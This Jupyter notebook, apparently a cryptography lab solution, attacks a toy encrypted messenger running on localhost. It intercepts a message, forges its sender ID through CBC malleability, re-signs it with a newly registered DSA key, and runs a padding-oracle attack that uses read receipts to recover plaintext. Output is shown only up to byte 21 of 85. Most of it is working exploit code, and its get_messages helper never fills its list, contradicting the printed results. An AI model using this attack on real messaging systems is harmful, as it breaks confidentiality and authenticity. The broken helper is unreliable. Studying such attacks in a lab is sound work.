{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Note that some of the output are already printed below. You can just read them to save running time.\n",
    "## Run the first 5 cells for the functions required to run the 3 parts."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "from datetime import datetime\n",
    "import copy\n",
    "import time\n",
    "import base64\n",
    "from cryptography.hazmat.backends import default_backend\n",
    "from cryptography.hazmat.primitives.asymmetric import rsa\n",
    "from cryptography.hazmat.primitives.asymmetric import dsa\n",
    "from cryptography.hazmat.primitives import hashes\n",
    "from cryptography.hazmat.primitives import serialization\n",
    "from Crypto.Util.strxor import strxor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def get_messages(username):\n",
    "    r = requests.get(server_address + \"getMessages/\" + username, headers={\"Accept\" : \"application/json\"})\n",
    "    json_r = json.loads(r.text)\n",
    "    msg_qty = json_r[\"numMessages\"]\n",
    "    msg_qty_without_receipts = msg_qty\n",
    "    encrypted_message_list = []\n",
    "    if msg_qty == 0:\n",
    "        return [], None\n",
    "    else:\n",
    "        for i in range(0, msg_qty):\n",
    "            encrypted_msg = json_r[\"messages\"][i][\"message\"]\n",
    "            sender_id = json_r[\"messages\"][i][\"senderID\"]\n",
    "            message_id = json_r[\"messages\"][i][\"messageID\"]\n",
    "        return encrypted_message_list, json_r\n",
    "def send_message(username, recipient_username, message_id, encrypted_message):\n",
    "    data = {\"recipient\": recipient_username, \"messageID\": message_id, \"message\": encrypted_message}\n",
    "    r = requests.post(server_address + \"sendMessage/\" + username, json=data, headers={\"Accept\" : \"application/json\"})\n",
    "    return r\n",
    "def intercept_message(username):\n",
    "    encrypted_message_list = []\n",
    "    json_r = None\n",
    "    while encrypted_message_list==[]:\n",
    "        time.sleep(0.05)\n",
    "        encrypted_message_list, json_r = get_messages(username)\n",
    "    for msg in encrypted_message_list:\n",
    "        r = send_message(msg[2], username, msg[1], msg[0])\n",
    "        #print r.text, \"message sent from\", msg[2], \"to\", username, msg[1], msg[0]\n",
    "        print r.text\n",
    "    return encrypted_message_list\n",
    "def read_message(username):\n",
    "    encrypted_message_list = []\n",
    "    json_r = None\n",
    "    while encrypted_message_list==[]:\n",
    "        time.sleep(0.5)\n",
    "        encrypted_message_list, json_r = get_messages(username)\n",
    "    return encrypted_message_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def rsa_keypair_gen():\n",
    "    sk = rsa.generate_private_key(public_exponent=65537, key_size=1024, backend=default_backend())\n",
    "    pk = sk.public_key()\n",
    "    return pk, sk\n",
    "def dsa_keypair_gen():\n",
    "    sk = dsa.generate_private_key(key_size=1024, backend=default_backend())\n",
    "    pk = sk.public_key()\n",
    "    return pk, sk\n",
    "def encode_pk(pk_rsa, pk_dsa):\n",
    "    #1. DER encoding\n",
    "    pk_rsa_bytes = pk_rsa.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)\n",
    "    pk_dsa_bytes = pk_dsa.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)\n",
    "    #2. Base64 encoding\n",
    "    pk_rsa_bytes_encoded = base64.b64encode(pk_rsa_bytes)\n",
    "    pk_dsa_bytes_encoded = base64.b64encode(pk_dsa_bytes)\n",
    "    #3. Concatenation in format: Base64_RSA_PubKey||ASCII(0x25)||Base64_DSA_PubKey\n",
    "    encoded_string = pk_rsa_bytes_encoded + \"\\x25\" + pk_dsa_bytes_encoded\n",
    "    return encoded_string\n",
    "def register_key(username, key_data):\n",
    "    data = {\"keyData\": key_data}\n",
    "    r = requests.post(server_address + \"registerKey/\" + username, json=data, headers={\"Accept\" : \"application/json\"})\n",
    "    return r\n",
    "def dsa_sign(sk_dsa, msg):\n",
    "    signer = sk_dsa.signer(hashes.SHA1())\n",
    "    signer.update(msg)\n",
    "    signature = signer.finalize()\n",
    "    return signature"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def maul_senderid_and_resign(c, new_sender_id, old_sender_id, new_sender_sk_dsa):\n",
    "    c_elements = c.split(\"\\x20\")\n",
    "    c1_base64 = c_elements[0]\n",
    "    c2_base64 = c_elements[1]\n",
    "    c1 = base64.b64decode(c1_base64)\n",
    "    c2 = base64.b64decode(c2_base64)\n",
    "    iv = c2[:16]\n",
    "    c2_withoutiv = c2[16:]\n",
    "    \n",
    "    old_senderid_padded = str(old_sender_id) + str('\\x00' * (len(c2_withoutiv)-len(old_sender_id)))\n",
    "    new_senderid_padded = str(new_sender_id) + str('\\x00' * (len(c2_withoutiv)-len(new_sender_id)))\n",
    "    #print ' '.join(format(ord(x), 'b') for x in old_senderid_padded), ' '.join(format(ord(x), 'b') for x in new_senderid_padded)\n",
    "    old_xor_new = strxor(old_senderid_padded, new_senderid_padded)\n",
    "    #print ' '.join(format(ord(x), 'b') for x in old_xor_new)\n",
    "    new_c2_withoutiv = strxor(str(c2_withoutiv), old_xor_new)\n",
    "    #print new_c2_withoutiv\n",
    "    new_c2 = iv + bytes(new_c2_withoutiv)\n",
    "    new_c2_base64 = base64.b64encode(new_c2)\n",
    "    \n",
    "    new_c_without_sig_base64_utf8 = c1_base64.encode('utf-8')+\"\\x20\".encode('utf-8')+new_c2_base64.encode('utf-8')\n",
    "    #resign\n",
    "    new_dsa_sig = dsa_sign(new_sender_sk_dsa, new_c_without_sig_base64_utf8)\n",
    "    new_dsa_sig_base64_utf8 = base64.b64encode(new_dsa_sig).encode('utf-8')\n",
    "    new_c = new_c_without_sig_base64_utf8 + \"\\x20\".encode(\"utf-8\") + new_dsa_sig_base64_utf8\n",
    "    \n",
    "    return new_c\n",
    "    \n",
    "def maul_senderid_and_replay(encrypted_message, new_sender_id):\n",
    "    encrypted_string = encrypted_message[0]\n",
    "    message_id = encrypted_message[1]\n",
    "    old_sender_id = encrypted_message[2]\n",
    "    recipient_id = encrypted_message[3]\n",
    "    special_sender_id = new_sender_id\n",
    "    \n",
    "    if \":\" in new_sender_id:\n",
    "        special_sender_id = new_sender_id[:new_sender_id.index(\":\")]\n",
    "    \n",
    "    #generate new keys for new_sender_id\n",
    "    pk_rsa, sk_rsa = rsa_keypair_gen()\n",
    "    pk_dsa, sk_dsa = dsa_keypair_gen()\n",
    "    encoded_str = encode_pk(pk_rsa, pk_dsa)\n",
    "    #register the keys\n",
    "    r = register_key(special_sender_id, encoded_str)\n",
    "    if r.text == '{\"result\": true}':\n",
    "        print special_sender_id, \"keys registered successfully.\"\n",
    "    \n",
    "    new_encrypted_string = maul_senderid_and_resign(encrypted_string, new_sender_id, old_sender_id, sk_dsa)\n",
    "    #new_sender_id has to be same length as old_sender_id\n",
    "    new_encrypted_message = [new_encrypted_string, message_id, special_sender_id, recipient_id]\n",
    "    r = send_message(new_encrypted_message[2], new_encrypted_message[3], new_encrypted_message[1], new_encrypted_message[0])\n",
    "    return r.text, new_encrypted_message, sk_dsa, new_sender_id"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "def oracle_output(msg):\n",
    "    x, r = get_messages(msg[2])\n",
    "    r = send_message(msg[2], msg[3], msg[1], msg[0])\n",
    "    time.sleep(8)\n",
    "    enc_msg, json_r2 = get_messages(msg[2])\n",
    "    if enc_msg != [] and enc_msg[0][2] == msg[3]:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "def get_padding_length(msg, sk_dsa, mauled_senderid):\n",
    "    new_msg = copy.deepcopy(msg)\n",
    "    c = new_msg[0]\n",
    "    sender = new_msg[2]\n",
    "    sender_len = len(mauled_senderid)\n",
    "    c_elements = c.split(\"\\x20\")\n",
    "    c1_base64 = c_elements[0]\n",
    "    c2_base64 = c_elements[1]\n",
    "    c1 = base64.b64decode(c1_base64)\n",
    "    c2 = base64.b64decode(c2_base64)\n",
    "    iv = c2[:16]\n",
    "    c2_withoutiv = c2[16:]\n",
    "    \n",
    "    padding_value = None\n",
    "    str_to_xor = \"\"\n",
    "    max_pad = 17\n",
    "    if len(c2_withoutiv) < 16+sender_len+1:\n",
    "        max_pad = 12\n",
    "    for i in xrange(1, max_pad):\n",
    "        str_to_xor = \"\\x00\"*(len(c2_withoutiv)-i-1) + \"\\x01\" + \"\\x00\"*i\n",
    "        print str_to_xor.encode('hex')\n",
    "        \n",
    "        new_c2_withoutiv = strxor(str(c2_withoutiv), str_to_xor)\n",
    "        print new_c2_withoutiv.encode('hex')\n",
    "        \n",
    "        new_c2 = iv + bytes(new_c2_withoutiv)\n",
    "        new_c2_base64 = base64.b64encode(new_c2)\n",
    "        new_c_without_sig_base64_utf8 = c1_base64.encode('utf-8')+\"\\x20\".encode('utf-8')+new_c2_base64.encode('utf-8')\n",
    "        \n",
    "        #resign and repack\n",
    "        new_dsa_sig = dsa_sign(sk_dsa, new_c_without_sig_base64_utf8)\n",
    "        new_dsa_sig_base64_utf8 = base64.b64encode(new_dsa_sig).encode('utf-8')\n",
    "        new_c = new_c_without_sig_base64_utf8 + \"\\x20\".encode(\"utf-8\") + new_dsa_sig_base64_utf8\n",
    "        new_msg[0] = new_c\n",
    "        \n",
    "        if oracle_output(new_msg) == True:\n",
    "            padding_value = i\n",
    "            break\n",
    "    return padding_value\n",
    "def padding_oracle_decrypter(msg, padding_value, sk_dsa, mauled_senderid):\n",
    "    new_msg = copy.deepcopy(msg)\n",
    "    c = new_msg[0]\n",
    "    sender = new_msg[2]\n",
    "    sender_len = len(mauled_senderid)\n",
    "    c_elements = c.split(\"\\x20\")\n",
    "    c1_base64 = c_elements[0]\n",
    "    c2_base64 = c_elements[1]\n",
    "    c1 = base64.b64decode(c1_base64)\n",
    "    c2 = base64.b64decode(c2_base64)\n",
    "    iv = c2[:16]\n",
    "    c2_withoutiv = c2[16:]\n",
    "    #print c2_withoutiv.encode('hex')\n",
    "    \n",
    "    str_to_xor = \"\"\n",
    "    recovered_msg = \"\"\n",
    "    mauled_c2 = str(c2_withoutiv)\n",
    "    msg_len = len(c2_withoutiv)-sender_len-1-padding_value\n",
    "    x = 0\n",
    "    for y in xrange(1, msg_len+1):\n",
    "        x += 1\n",
    "        print \"currently guessing\", y, \"of\", msg_len, \"bytes (message+CRC)\"\n",
    "        #to be used to XOR to neuralize the previous padding\n",
    "        prev_padding_neutralizer = \"\\x00\"*(len(mauled_c2)-(padding_value+x-1)) + str(bytearray([padding_value+x-1])*(padding_value+x-1))\n",
    "        mauled_c2 = strxor(mauled_c2, str(prev_padding_neutralizer))\n",
    "        \n",
    "        #if all 16 bytes padding used up, cut off 15 bytes and start with padding_value of 1\n",
    "        if x+padding_value > 16:\n",
    "            mauled_c2 = mauled_c2[:-15]\n",
    "            padding_value = 2\n",
    "            x = 0\n",
    "        \n",
    "        #to be used to XOR to add a new padding\n",
    "        new_padding_adder = \"\\x00\"*(len(mauled_c2)-(padding_value+x-1)) + str(bytearray([padding_value+x])*(padding_value+x-1))\n",
    "        \n",
    "        mauled_c2 = strxor(mauled_c2, str(new_padding_adder))\n",
    "        #print \"new padding added with\\t\\t\", new_padding_adder.encode('hex')\n",
    "        #print mauled_c2\n",
    "        \n",
    "        for num in range(256):\n",
    "            curr_guess = chr(num)\n",
    "            curr_guess_xor_curr_pad = strxor(curr_guess, str(bytearray([padding_value+x])))\n",
    "            #print num, curr_guess.encode('hex'), \"xor\", padding_value+x, \"=\", curr_guess_xor_curr_pad.encode('hex')\n",
    "            str_to_xor = \"\\x00\"*(len(mauled_c2)-(padding_value+x)) + curr_guess_xor_curr_pad + \"\\x00\"*(padding_value+x-1)\n",
    "            #print \"Trying out with\\t\\t\\t\", str_to_xor.encode('hex')\n",
    "            #print len(mauled_c2), len(str_to_xor)\n",
    "            mauled_c2_test = strxor(mauled_c2, str_to_xor)\n",
    "            #print \"Mauled C2 is now\\t\\t\", mauled_c2.encode('hex')\n",
    "            \n",
    "            #concat IV and C1 again\n",
    "            new_c2 = iv + bytes(mauled_c2_test)\n",
    "            new_c2_base64 = base64.b64encode(new_c2)\n",
    "            new_c_without_sig_base64_utf8 = c1_base64.encode('utf-8')+\"\\x20\".encode('utf-8')+new_c2_base64.encode('utf-8')\n",
    "        \n",
    "            #resign and repack\n",
    "            new_dsa_sig = dsa_sign(sk_dsa, new_c_without_sig_base64_utf8)\n",
    "            new_dsa_sig_base64_utf8 = base64.b64encode(new_dsa_sig).encode('utf-8')\n",
    "            new_c = new_c_without_sig_base64_utf8 + \"\\x20\".encode(\"utf-8\") + new_dsa_sig_base64_utf8\n",
    "            new_msg[0] = new_c\n",
    "            \n",
    "            if oracle_output(new_msg) == True:\n",
    "                recovered_msg = str(curr_guess) + recovered_msg\n",
    "                print \"recovered\", curr_guess.encode('hex')\n",
    "                mauled_c2 = mauled_c2_test\n",
    "                break\n",
    "            elif num == 255:\n",
    "                print \"error: something went wrong.\", recovered_msg.encode('hex')\n",
    "    return recovered_msg"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Run this cell below this so that the program knows what server address to use."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "server_address = \"http://127.0.0.1/\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Part 1:\n",
    "With alice/bob clients already running, run this cell below to intercept a message. This will \"catch\" a message, store it, and send it back to the server without changing it. Print the variable \"intercepted\" at an empty cell below to see the message intercepted."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"message\": \"message delivered\", \"result\": true}\n"
     ]
    }
   ],
   "source": [
    "intercepted = intercept_message(\"bob\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Part 2:\n",
    "Now that we have a message intercepted from bob, run this cell below to maul the sender name from \"alice\" to \"a:lice\". This means that the client will interpret it as being sent from \"a\", because the running clients cuts out bytes for the sender id up until the \":\" character. This step is important for the padding oracle attack to work, in order to obtain the first 4 bytes of the message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a keys registered successfully.\n"
     ]
    }
   ],
   "source": [
    "rtext, mauled_msg, sk_dsa, mauled_senderid = maul_senderid_and_replay(intercepted[0], \"a:ice\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Run this cell below to get the read receipt for the mauled message sent out above, as sender \"a\". This is also important for clearing the read receipts in the server for \"a\", because it might mess up the oracle later on."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[[u'KQ+vPbTSzTNmx2dHYUX3mtN2KFDVipBVCvh2cGdTADD+8SABnZwHydE4pHXvSPOrnAb49lqUrZwqHU6KAnAaUQvwuuwg62lJM9JObwjYWolsm7h1xeqEyoAD361EggQdmbm4oZePHMAlkMCD6eRxkTv/9hBVPbvV/E397uKdLus= AAAAAAAAAAAAAAAAAAAAAGs0FlQgzS2WaFrFFOn51VFpGqWRzjahXPYSGAx6Vz8G MCwCFD7EpF9VEr6ed0oNVL6Whbvm11VOAhQM5/AJSqB8C4M4c+SHQ5zzhI/Pjg==',\n",
       "  9036,\n",
       "  u'bob',\n",
       "  'a']]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "read_message(mauled_msg[2])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Part 3:\n",
    "This is the first part of the padding oracle attack. Run this cell below to find out the length of the padding currently in the encrypted message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100\n",
      "21b153dac6a9b2d2b0a6052b924a78891e8ccacd34f07bba41e7f64aec810071ca8fbeffb15d6a496aa8927816a42f7b11a8b4c79e961adc5431099407fa4617dfdf993c5a66c6f7893325fe3cc0d9bc9e8a9c07442a9c1e2b05dbfe41e4107a\n",
      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000\n",
      "21b153dac6a9b2d2b0a6052b924a78891e8ccacd34f07bba41e7f64aec810071ca8fbeffb15d6a496aa8927816a42f7b11a8b4c79e961adc5431099407fa4617dfdf993c5a66c6f7893325fe3cc0d9bc9e8a9c07442a9c1e2b05dbfe41e5117a\n",
      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000\n",
      "21b153dac6a9b2d2b0a6052b924a78891e8ccacd34f07bba41e7f64aec810071ca8fbeffb15d6a496aa8927816a42f7b11a8b4c79e961adc5431099407fa4617dfdf993c5a66c6f7893325fe3cc0d9bc9e8a9c07442a9c1e2b05dbfe40e4117a\n",
      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000\n",
      "21b153dac6a9b2d2b0a6052b924a78891e8ccacd34f07bba41e7f64aec810071ca8fbeffb15d6a496aa8927816a42f7b11a8b4c79e961adc5431099407fa4617dfdf993c5a66c6f7893325fe3cc0d9bc9e8a9c07442a9c1e2b05dbff41e4117a\n",
      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000\n",
      "21b153dac6a9b2d2b0a6052b924a78891e8ccacd34f07bba41e7f64aec810071ca8fbeffb15d6a496aa8927816a42f7b11a8b4c79e961adc5431099407fa4617dfdf993c5a66c6f7893325fe3cc0d9bc9e8a9c07442a9c1e2b05dafe41e4117a\n",
      "5\n"
     ]
    }
   ],
   "source": [
    "padding_val = get_padding_length(mauled_msg, sk_dsa, mauled_senderid)\n",
    "print padding_val"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Main part of padding oracle attack:\n",
    "This is the main part of the padding oracle attack to decrypt the message that was intercepted and mauled earlier, given that we now know the length of the padding in the ciphertext. It will take several hours to recover the entire plaintext since the oracle takes about 5-8s to wait for a possible read receipt for each message. Part of the code's output is already printed below (last 20 bytes, including 4 bytes of CRC), showing the bytes that were recovered. Didn't have time to get the entire output below because it took too long.  \n",
    "The entire plaintext in ASCII when fully decrypted should be:  \n",
    "\"Hey bob, what do you think about 09 F9 11 02 9D 74 E3 5B D8 41 56 C5 63 56 88 C0?\"  \n",
    "In hexadecimal:  \n",
    "\"48657920626f622c207768617420646f20796f75207468696e6b2061626f75742030392046392031312030322039442037342045332035422044382034312035362043352036332035362038382043303f\"  \n",
    "In hexadecimal with spaces between each character, for easier comparison with the output of my code:  \n",
    "\"48 65 79 20 62 6f 62 2c 20 77 68 61 74 20 64 6f 20 79 6f 75 20 74 68 69 6e 6b 20 61 62 6f 75 74 20 30 39 20 46 39 20 31 31 20 30 32 20 39 44 20 37 34 20 45 33 20 35 42 20 44 38 20 34 31 20 35 36 20 43 35 20 36 33 20 35 36 20 38 38 20 43 30 3f\"  \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sun Dec 11 20:48:45 2016\n",
      "currently guessing 1 of 85 bytes (message+CRC)\n",
      "recovered f1\n",
      "currently guessing 2 of 85 bytes (message+CRC)\n",
      "recovered 8c\n",
      "currently guessing 3 of 85 bytes (message+CRC)\n",
      "recovered f4\n",
      "currently guessing 4 of 85 bytes (message+CRC)\n",
      "recovered c6\n",
      "currently guessing 5 of 85 bytes (message+CRC)\n",
      "recovered 3f\n",
      "currently guessing 6 of 85 bytes (message+CRC)\n",
      "recovered 30\n",
      "currently guessing 7 of 85 bytes (message+CRC)\n",
      "recovered 43\n",
      "currently guessing 8 of 85 bytes (message+CRC)\n",
      "recovered 20\n",
      "currently guessing 9 of 85 bytes (message+CRC)\n",
      "recovered 38\n",
      "currently guessing 10 of 85 bytes (message+CRC)\n",
      "recovered 38\n",
      "currently guessing 11 of 85 bytes (message+CRC)\n",
      "recovered 20\n",
      "currently guessing 12 of 85 bytes (message+CRC)\n",
      "recovered 36\n",
      "currently guessing 13 of 85 bytes (message+CRC)\n",
      "recovered 35\n",
      "currently guessing 14 of 85 bytes (message+CRC)\n",
      "recovered 20\n",
      "currently guessing 15 of 85 bytes (message+CRC)\n",
      "recovered 33\n",
      "currently guessing 16 of 85 bytes (message+CRC)\n",
      "recovered 36\n",
      "currently guessing 17 of 85 bytes (message+CRC)\n",
      "recovered 20\n",
      "currently guessing 18 of 85 bytes (message+CRC)\n",
      "recovered 35\n",
      "currently guessing 19 of 85 bytes (message+CRC)\n",
      "recovered 43\n",
      "currently guessing 20 of 85 bytes (message+CRC)\n",
      "recovered 20\n",
      "currently guessing 21 of 85 bytes (message+CRC)\n"
     ]
    }
   ],
   "source": [
    "print time.ctime()\n",
    "padding_oracle_decrypter(mauled_msg, padding_val, sk_dsa, mauled_senderid)\n",
    "print time.ctime()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
